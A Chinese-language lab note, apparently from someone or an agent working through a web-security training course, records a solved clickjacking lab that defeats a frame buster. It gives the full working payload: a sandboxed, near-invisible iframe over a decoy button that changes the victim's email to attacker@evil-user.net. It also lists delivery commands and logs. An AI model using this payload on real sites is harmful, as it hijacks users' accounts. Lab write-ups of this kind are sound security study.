---
title: "lab-frame-buster-script"
links:
  - target: clickjacking-family
    relation: evidences
---

# lab-frame-buster-script

> evidences: [[clickjacking-family]]

- 题面:Clickjacking with a frame buster script(/web-security/clickjacking/lab-frame-buster-script)
- 实例:https://0a6200f103c25be9802f21c100360017.web-security-academy.net(`wiener:peter`)
- 利用服务器:https://exploit-0a2e008d03225b85806a200e01770078.exploit-server.net
- 判定目标:诱导受害者点击后改掉其邮箱;状态:**solved**(回马枪;交付后 solved_check true)

## 已确认

1. frame buster:`if(top!=self){DOMContentLoaded→document.body.innerHTML='This page cannot be framed'}`;
   `/my-account?email=<值>` 预填 email 表单(按钮 "Update email")。
2. 量得按钮矩形(视口 500x700):**Update email @ (32, 467.65, 152, 33)**。
3. exploit:iframe `sandbox="allow-forms"`(禁脚本 → frame buster 不执行,表单仍可提交)指向
   `/my-account?email=attacker@evil-user.net`,半透明(z-index 2)盖在诱饵 `<button id=d>Click me</button>`
   (z-index 1,(32,467,152,33))之上。
4. **本次 solves**:交付(`--follow`)后受害者 bot 连续 7 次 `GET /exploit/`;`solved_check` true。

## 关键更正(相对 16:17 的 stuck 版)

- 旧结论“bot 是元素级合成点击、只点诱饵不到 iframe”**被推翻**。这次在顶层 `document` 挂了 capture 点击信标
  (`mousedown/up/click → /beacon?x=&y=`),日志里**没有任何 beacon 命中**,而 lab 已 solved →
  说明 bot 的点击是**坐标(命中测试)**点击,落在最上层的 iframe 上,而不是派发到诱饵 DOM 节点。
- 诱饵用 `<button id=d>`;iframe 在诱饵之上即可。之前 stuck 的成因另有其因(见 dom-based-xss 录:折叠/几何)。

## 证据摘录

```
exploit access log:
10.0.3.91  09:25:00..09:25:17  "GET /exploit/" ×7  "Mozilla/5.0 (Victim) … Chrome/154"   # 无 /beacon 命中
solved_check "https://0a6200f103c25be9802f21c100360017.web-security-academy.net/" --jar /tmp/b15c-jar2.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 71C2BCC46F11BE8E063FA976C68B2383FB1DFD04C1BE432086D3F030159F15AE --widget-source /web-security/clickjacking/lab-frame-buster-script --jar /tmp/b15c-jar2.json
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<button id=d style="position:fixed;left:32px;top:467px;width:152px;height:33px;z-index:1">Click me</button><iframe sandbox="allow-forms" src="https://<inst>/my-account?email=attacker@evil-user.net" style="position:fixed;left:0;top:0;width:500px;height:700px;opacity:0.0001;z-index:2;border:0"></iframe>' \
  --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15c-jar2.json
```
